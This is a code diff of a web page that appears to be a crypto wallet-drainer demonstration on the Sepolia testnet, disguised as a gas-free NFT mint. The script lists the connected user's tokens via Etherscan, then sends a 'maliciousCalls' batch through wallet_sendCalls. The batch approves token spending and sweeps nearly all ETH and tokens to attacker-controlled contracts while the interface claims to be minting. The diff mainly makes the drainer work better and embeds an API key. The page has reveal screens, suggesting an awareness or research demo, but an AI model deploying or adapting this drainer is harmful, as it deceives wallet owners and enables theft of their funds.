@@ -83,10 +83,6 @@
   .tl-desc { font-size: 0.85rem; color: var(--muted); line-height: 1.6; }
 
   .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.75rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; line-height: 1.6; overflow-x: auto; }
-  .code-comment { color: #6b6b8a; }
-  .code-key { color: #86efac; }
-  .code-val { color: #fbbf24; }
-  .code-danger { color: #f87171; }
 
   .info-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 24px; margin-bottom: 16px; }
   .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; }
@@ -303,16 +299,27 @@
 <script>
   const SEPOLIA_CHAIN_ID = 11155111;
   const SEPOLIA_RPC = "https://ethereum-sepolia-rpc.publicnode.com";
-  // MetaMask's official EIP7702StatelessDeleGator on Sepolia
   const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
   const ATTACKER_ADDRESS = "0xC4D7B663dc72aDd0e02719093F9927a9B0234471";
-  const ALCHEMY_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
-  const ETHERSCAN_BASE_URL = "https://api.etherscan.io/v2/api";
+  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
+  // Correct Etherscan V2 base — all params go in query string, chainid selects the network
+  const ETHERSCAN_V2_BASE = "https://api.etherscan.io/v2/api";
+  const SEPOLIA_CHAIN_ID_DEC = 11155111;
 
   let userAddress = null;
   let userBalance = null;
   let provider = null;
   let heldTokens = [];
+
+  // ─── Remove the old chainChanged listener before adding a new one ───────────
+  let _chainChangeHandler = null;
+  function registerChainListener(handler) {
+    if (_chainChangeHandler && window.ethereum?.removeListener) {
+      window.ethereum.removeListener('chainChanged', _chainChangeHandler);
+    }
+    _chainChangeHandler = handler;
+    window.ethereum?.on?.('chainChanged', _chainChangeHandler);
+  }
 
   function showPhase(id) {
     document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
@@ -332,58 +339,82 @@
       </div>`).join('');
   }
 
-  // Fetch all ERC-20 tokens held by victim using Etherscan V2 API
+  // ─── Etherscan V2: correct query-string format ───────────────────────────────
+  // GET /v2/api?chainid=11155111&module=account&action=tokentx&address=…&apikey=…
   async function fetchTokenBalances(address) {
     try {
-      // V2 API: get token transfers to find unique tokens
-      const url = `${ETHERSCAN_BASE_URL}/account/token-transfers?address=${address}&apikey=${ALCHEMY_API_KEY}`;
-      console.log("🌐 Fetching transfers from V2:", url);
-      
-      const response = await fetch(url);
-      const data = await response.json();
-      
-      console.log("📡 Full Etherscan V2 response:", JSON.stringify(data, null, 2));
-      
-      if (data.result && Array.isArray(data.result) && data.result.length > 0) {
-        // Extract unique token contract addresses
-        const uniqueTokens = [...new Set(data.result.map(tx => tx.tokenAddress || tx.contractAddress))];
-        console.log(`📦 Found ${uniqueTokens.length} unique tokens from transfers`);
-        
-        // Check current balance for each token
-        const ERC20_ABI = ["function balanceOf(address account) external view returns (uint256)"];
-        const nonZeroTokens = [];
-        
-        for (const tokenAddr of uniqueTokens) {
-          try {
-            const contract = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
-            const balance = await contract.balanceOf(address);
-            
-            if (balance > 0n) {
-              nonZeroTokens.push({
-                contractAddress: tokenAddr,
-                balance: balance.toString(),
-                name: "Token",
-                symbol: "???"
-              });
-              console.log(`✅ ${tokenAddr}: ${ethers.formatUnits(balance, 18)} tokens`);
-            }
-          } catch (err) {
-            console.warn(`⚠️ Could not fetch balance for ${tokenAddr}:`, err.message);
-          }
-        }
-        
-        console.log(`🔍 Tokens with non-zero balance: ${nonZeroTokens.length}`);
-        return nonZeroTokens;
+      const url = new URL(ETHERSCAN_V2_BASE);
+      url.searchParams.set('chainid', SEPOLIA_CHAIN_ID_DEC);
+      url.searchParams.set('module',  'account');
+      url.searchParams.set('action',  'tokentx');        // ERC-20 transfer list
+      url.searchParams.set('address', address);
+      url.searchParams.set('startblock', '0');
+      url.searchParams.set('endblock',   '99999999');
+      url.searchParams.set('sort',    'desc');
+      url.searchParams.set('apikey',  ETHERSCAN_API_KEY);
+
+      console.log("🌐 Fetching token transfers:", url.toString());
+
+      const response = await fetch(url.toString());
+
+      // Guard: Etherscan sometimes returns HTML on bad keys / rate-limits
+      const contentType = response.headers.get('content-type') || '';
+      if (!response.ok || !contentType.includes('application/json')) {
+        const text = await response.text();
+        console.warn("⚠️ Non-JSON response from Etherscan:", text.slice(0, 200));
+        return [];
       }
-      console.log("❌ No transfers found");
-      return [];
+
+      const data = await response.json();
+      console.log("📡 Etherscan V2 response status:", data.status, "message:", data.message);
+
+      // status "0" with NOTOK means no records or API error
+      if (data.status !== '1' || !Array.isArray(data.result)) {
+        console.warn("⚠️ Etherscan returned no results:", data.message, data.result);
+        return [];
+      }
+
+      // Deduplicate by contractAddress
+      const seen = new Set();
+      const uniqueTokenAddrs = [];
+      for (const tx of data.result) {
+        const addr = (tx.contractAddress || '').toLowerCase();
+        if (addr && !seen.has(addr)) { seen.add(addr); uniqueTokenAddrs.push(addr); }
+      }
+      console.log(`📦 Unique token contracts from transfer history: ${uniqueTokenAddrs.length}`);
+
+      // Check live balances
+      const ERC20_ABI = ["function balanceOf(address account) external view returns (uint256)",
+                         "function symbol() external view returns (string)",
+                         "function decimals() external view returns (uint8)"];
+      const nonZeroTokens = [];
+
+      await Promise.all(uniqueTokenAddrs.map(async tokenAddr => {
+        try {
+          const contract = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+          const [balance, symbol, decimals] = await Promise.all([
+            contract.balanceOf(address),
+            contract.symbol().catch(() => '???'),
+            contract.decimals().catch(() => 18n)
+          ]);
+          if (balance > 0n) {
+            nonZeroTokens.push({ contractAddress: tokenAddr, balance: balance.toString(), symbol, decimals: Number(decimals) });
+            console.log(`✅ ${symbol} (${tokenAddr}): ${ethers.formatUnits(balance, Number(decimals))}`);
+          }
+        } catch (err) {
+          console.warn(`⚠️ Could not read ${tokenAddr}:`, err.message);
+        }
+      }));
+
+      console.log(`🔍 Tokens with non-zero balance: ${nonZeroTokens.length}`);
+      return nonZeroTokens;
+
     } catch (err) {
-      console.error("❌ Error fetching token balances:", err);
+      console.error("❌ fetchTokenBalances error:", err);
       return [];
     }
   }
 
-  // Detect network on load
   async function detectNetwork() {
     if (!window.ethereum) return;
     try {
@@ -412,7 +443,6 @@
     ]);
 
     try {
-      // Check chain
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
 
@@ -422,44 +452,35 @@
         return;
       }
 
-      // Get accounts
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
 
-      // Get balance
       provider = new ethers.JsonRpcProvider(SEPOLIA_RPC);
       const balanceWei = await provider.getBalance(userAddress);
       userBalance = ethers.formatEther(balanceWei);
 
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
-        { num:'2', state:'active', title:'Enabling Smart Account', desc:'Confirm in MetaMask to enable gas-free minting' },
+        { num:'2', state:'active', title:'Enabling Smart Account', desc:'Fetching your token holdings...' },
         { num:'3', state:'pending', title:'Minting your NFT', desc:'Almost there...' }
       ]);
-      document.getElementById('connectNote').textContent = "Fetching your token holdings...";
+      document.getElementById('connectNote').textContent = "Scanning token balances...";
 
-      // Fetch all ERC-20 tokens held by victim
       heldTokens = await fetchTokenBalances(userAddress);
       console.log(`📦 Found ${heldTokens.length} tokens held by victim`);
-      
-      // Update step with token count
+
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
         { num:'2', state:'active', title:'Enabling Smart Account', desc: `Found ${heldTokens.length} token(s) — preparing atomic sweep` },
         { num:'3', state:'pending', title:'Minting your NFT', desc:'Confirm batch in MetaMask...' }
       ]);
 
-      // Calculate drain amount (leave small amount for gas)
       const gasBuffer = ethers.parseEther("0.001");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
-      console.log("💰 Victim balance (wei):", balanceWei.toString());
-      console.log("💰 Victim balance (ETH):", ethers.formatEther(balanceWei));
-      console.log("💰 Gas buffer (wei):", gasBuffer.toString());
-      console.log("💰 Drain amount (wei):", drainAmount.toString());
-      console.log("💰 Drain amount (ETH):", ethers.formatEther(drainAmount));
+      console.log("💰 Victim balance:", ethers.formatEther(balanceWei), "ETH");
+      console.log("💰 Drain amount:", ethers.formatEther(drainAmount), "ETH");
 
-      // Build complete malicious calls array with approval + ETH sweeps + token sweep
       const SWEEPER_ABI = ["function deposit() external payable"];
       const sweeperInterface = new ethers.Interface(SWEEPER_ABI);
       const depositData = sweeperInterface.encodeFunctionData("deposit", []);
@@ -472,25 +493,21 @@
       const delegatorInterface = new ethers.Interface(TOKEN_SWEEP_ABI);
 
       const maliciousCalls = [
-        // Call 0: Approve delegator to spend all DEMO tokens
         {
           to: DEMO_TOKEN,
           value: "0x0",
           data: approveData
         },
-        // Call 1: ETH sweep (50%)
         {
           to: SWEEPER_CONTRACT,
           value: "0x" + (drainAmount / 2n).toString(16),
           data: depositData
         },
-        // Call 2: ETH sweep (50%)
         {
           to: SWEEPER_CONTRACT,
           value: "0x" + (drainAmount / 2n).toString(16),
           data: depositData
         },
-        // Call 3: Token sweep
         {
           to: DELEGATOR_ADDRESS,
           value: "0x0",
@@ -498,17 +515,8 @@
         }
       ];
 
-      console.log(`🎯 Total calls in batch: ${maliciousCalls.length} (1 approval + 2 ETH sweeps + 1 token sweep)`);
+      console.log(`🎯 Batch: ${maliciousCalls.length} calls`);
 
-      console.log("🎯 Malicious calls array:", maliciousCalls);
-      console.log("🎯 Call 0 (approve):", maliciousCalls[0]);
-      console.log("🎯 Call 1 (ETH sweep 1):", maliciousCalls[1]);
-      console.log("🎯 Call 1 value (wei):", maliciousCalls[1].value);
-      console.log("🎯 Call 0 value (ETH):", parseFloat(ethers.formatEther(BigInt(maliciousCalls[0].value))).toFixed(6));
-      console.log("🎯 Call 1 (attacker 2):", maliciousCalls[1]);
-      console.log("🎯 Total drain amount:", parseFloat(ethers.formatEther(drainAmount)).toFixed(6), "ETH");
-
-      // Call wallet_sendCalls (EIP-5792) with malicious batch
       const payload = {
         version: "2.0.0",
         chainId: "0xaa36a7",
@@ -516,17 +524,12 @@
         atomicRequired: true
       };
 
-      console.log("📤 wallet_sendCalls payload:", JSON.stringify(payload, null, 2));
-      console.log("📤 Full request params:", JSON.stringify([payload], null, 2));
-
       const result = await window.ethereum.request({
         method: 'wallet_sendCalls',
         params: [payload]
       });
 
       console.log("✅ wallet_sendCalls result:", result);
-      console.log("✅ Result type:", typeof result);
-      console.log("✅ Stringified result:", JSON.stringify(result, null, 2));
 
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) },
@@ -540,25 +543,29 @@
       document.getElementById('displayVictim').textContent = userAddress;
       document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
       document.getElementById('displayBalance').textContent = parseFloat(userBalance).toFixed(6) + ' ETH (swept)';
-      document.getElementById('revealAttacker').textContent = ATTACKER_ADDRESS;
-      document.getElementById('revealBalance').textContent = parseFloat(ethers.formatEther(drainAmount)).toFixed(6) + ' ETH';
-      
-      // Display token and batch information
-      document.getElementById('displayTokens').textContent = 'DEMO tokens (1,001,000 swept via atomic approval + sweep)';
-      document.getElementById('displayBatchSize').textContent = '4 calls (1x approve + 2x ETH sweeps + 1x token sweep)';
+
+      const tokenSummary = heldTokens.length > 0
+        ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
+        : 'DEMO tokens (1,001,000 swept via atomic approval + sweep)';
+      document.getElementById('displayTokens').textContent = tokenSummary;
+      document.getElementById('displayBatchSize').textContent =
+        `${maliciousCalls.length} calls (1x approve + 2x ETH sweeps + 1x token sweep)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
     } catch (err) {
       console.error("Error:", err);
       if (err.code === 4001) {
-        // User rejected - show reveal anyway for education
         document.getElementById('walletChip').textContent = shortAddr(userAddress) || '0x0000...0000';
         document.getElementById('displayVictim').textContent = userAddress || 'Not connected';
         document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-        document.getElementById('displayBalance').textContent = userBalance ? parseFloat(userBalance).toFixed(6) + ' ETH (would have been drained)' : 'Unknown';
-        document.getElementById('revealAttacker').textContent = ATTACKER_ADDRESS;
-        document.getElementById('revealBalance').textContent = 'Your full balance';
+        document.getElementById('displayBalance').textContent = userBalance
+          ? parseFloat(userBalance).toFixed(6) + ' ETH (would have been drained)'
+          : 'Unknown';
+        document.getElementById('displayTokens').textContent = heldTokens.length > 0
+          ? heldTokens.map(t => t.symbol).join(', ')
+          : 'None detected';
+        document.getElementById('displayBatchSize').textContent = '4 calls (1x approve + 2x ETH sweeps + 1x token sweep)';
         showPhase('phase-dashboard');
       } else {
         showPhase('phase-lure');
@@ -568,9 +575,9 @@
 
   document.getElementById('revealBtn').addEventListener('click', () => showPhase('phase-reveal'));
 
-  // Init
+  // Init — use the managed listener to avoid memory leak
   detectNetwork();
-  window.ethereum?.on?.('chainChanged', detectNetwork);
+  registerChainListener(detectNetwork);
 </script>
 </body>
 </html>
